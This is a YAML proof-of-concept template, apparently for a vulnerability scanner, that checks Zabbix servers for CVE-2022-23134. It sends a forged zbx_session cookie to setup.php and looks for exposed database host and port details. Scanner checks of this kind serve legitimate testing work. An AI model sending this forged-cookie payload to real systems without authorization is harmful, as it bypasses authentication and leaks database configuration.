name: yaml-poc-fedoraproject-fedora-unauthorized_access-CVE-2022-23134
binding: 985ddfa3-0379-4a06-9c18-7065830d6d10
detail:
    author: system_user
    links:
        - https://lists.debian.org/debian-lts-announce/2022/02/msg00008.html
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6SZYHXINBKCY42ITFSNCYE7KCSF33VRA/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VB6W556GVXOKUYTASTDGL3AI7S3SJHX7/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6SZYHXINBKCY42ITFSNCYE7KCSF33VRA/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VB6W556GVXOKUYTASTDGL3AI7S3SJHX7/
        - https://nvd.nist.gov/vuln/detail/CVE-2022-23134
        - https://support.zabbix.com/browse/ZBX-20384
        - https://vigilance.fr/vulnerability/Zabbix-information-disclosure-via-Setup-Pages-37255
        - https://www.cybersecurity-help.cz/vdb/SB2022022308
    vulnerability:
        id: 9c3f5b69-5aac-4bbf-9c46-b0f4843474e8
        level: medium
transport: http
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /zabbix/setup.php
            headers:
                cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
        expression: response.status == 200 && response.body.bcontains(b"Database") && response.body.bcontains(b"host") && response.body.bcontains(b"port") && response.body.bcontains(b"Zabbix")
    r2:
        request:
            cache: true
            method: GET
            path: /setup.php
            headers:
                cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D
        expression: response.status == 200 && response.body.bcontains(b"Database") && response.body.bcontains(b"host") && response.body.bcontains(b"port") && response.body.bcontains(b"Zabbix")
expression: r1() || r2()
